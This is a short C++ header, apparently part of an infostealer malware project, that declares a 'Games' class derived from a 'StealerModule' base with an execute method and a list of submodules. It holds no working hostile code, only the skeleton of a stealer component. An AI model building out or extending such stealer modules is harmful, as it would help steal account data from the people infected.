//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_GAMES_H
#define STEALER_GAMES_H


#include "../../StealerModule.h"
#include <thread>

class Games : public StealerModule {
public:
    Games();
    void execute(fs::path &root) override;
private:
    std::list<StealerModule*> modules;
};


#endif //STEALER_GAMES_H
